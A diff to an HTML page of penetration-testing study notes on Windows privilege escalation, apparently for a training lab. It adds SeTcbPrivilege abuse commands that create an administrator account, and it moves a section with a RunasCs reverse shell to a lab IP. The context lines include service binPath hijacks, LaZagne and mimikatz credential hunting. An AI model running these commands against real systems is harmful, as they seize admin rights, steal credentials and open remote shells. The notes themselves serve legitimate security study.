@@ -328,6 +328,15 @@ Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,D
                             </ul>
 
                         </ul>
+
+                        <h3>SeTcbPrivilege</h3>
+                        <ul>
+                            <p>If you see that your user is granted with SeTcbPrivilege you are almost administrator of the computer <a class="notion-link" href="https://github.com/mSameerMalik/SeTcbPrivilege_escalation/">Poc can be found here</a></p>
+                            <p>Once you deployed <b>SeTcb.exe</b> inside the victim computer run the following command in order to create a new user</p>
+                            <pre><code class="language-bash">.\SeTcb.exe svc_add "cmd /c net user hacker pass123#! /add"</code></pre>
+                            <p>Subsecuently use <b>net user</b> command to check if the user was created. If positive, now add it to the administrator group </p>
+                            <pre><code class="language-bash">.\SeTcb.exe group "cmd /c net localgroup administrators hacker /add" </code></pre>
+                        </ul>
                     </ul>
 
                     <h2 id="Windows groups">Windows groups</h2>
@@ -476,6 +485,7 @@ reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1</code></p
                     <p>In order to execute any command as system we can change the binary path</p>
                     <pre><code class="language-powershell">sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"  #We can add another user in the Administrators group
 sc config AppReadiness binPath= "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File C:\Users\server_adm\Desktop\shell.ps1" #Perform a reverse shell connection</code></pre>
+                    <p>Other services can be used for the same purpose</p>
                     </ul>
                 </ul>
                 
@@ -665,6 +675,7 @@ $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\dam
 
                     <h2 id="Credential hunting">Credential hunting</h2>
                     <ul>    
+                        <b>After Using any tool it is very recommended to check appdata folder in look for some credentials, or sensitive files that you may find</b>
                         <p>Once we gained access to a computer/domain we can perform credential huntgin by using <b>LaZagne</b></p>
                         <pre><code class="language-powershell">.\LaZagne.exe all</code></pre>
                         <p>Other similar software <a class="notion-link" href="https://github.com/Arvanaghi/SessionGopher">SessionGopher</a></p>
@@ -804,22 +815,6 @@ Security settings
                         
                     </ul>
 
-                    <h2 id="Run commands as another user Runas.exe">Run commands as another user Runas.exe</h2>
-                    <ul>
-                        <p>In case you are in an environment where you have credentials for another user but you are not able to stablish a connection though another port or similar there are some ways to execute commands as another user</p>
-                        <h3>Meh option</h3>
-                        <ul>
-                            <p>You could use LOL tools in order to stablish a reverse shell. This option is good but it may fail due the instability of the shell</p>
-                            <pre><code class="language-powershell">Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami } </code></pre>
-                        </ul>
-
-                        <h3>Great option</h3>
-                        <ul>
-                            <p>Using RunasCs.exe it's a good option but we should use nc to stablish a proper shell</p>
-                            <pre><code class="language-powershell">.\RunasCs.exe USER PASS powershell.exe -r 10.10.14.91:8000</code></pre>
-                        </ul>
-                    </ul>
-
                     <h2 id="Enumerating with cmdkey (Stored credentials)">Enumerating with cmdkey (Stored credentials)</h2>
                     <ul>
                         <p>We can use cmdkey to enumerate the credentials stored in the current user's profile. In case we see another use we could try to login resuing credentials without issuing any cred</p>
@@ -862,6 +857,22 @@ mimikatz # sekurlsa::credman  </code></pre>
                             <p>Note: In case you can't download the stored password use this command</p> 
                             <pre><code class="language-powershell">[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\roaming\microsoft\credentials\C4BB96844A5C9DD45D5B6A9859252BA6'))</code></pre>
                             
+                        </ul>
+                    </ul>
+
+                    <h2 id="Run commands as another user Runas.exe">Run commands as another user Runas.exe</h2>
+                    <ul>
+                        <p>In case you are in an environment where you have credentials for another user but you are not able to stablish a connection though another port or similar there are some ways to execute commands as another user</p>
+                        <h3>Meh option</h3>
+                        <ul>
+                            <p>You could use LOL tools in order to stablish a reverse shell. This option is good but it may fail due the instability of the shell</p>
+                            <pre><code class="language-powershell">Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami } </code></pre>
+                        </ul>
+
+                        <h3>Great option</h3>
+                        <ul>
+                            <p>Using RunasCs.exe it's a good option but we should use nc to stablish a proper shell</p>
+                            <pre><code class="language-powershell">.\RunasCs.exe USER PASS powershell.exe -r 10.10.14.91:8000</code></pre>
                         </ul>
                     </ul>
 
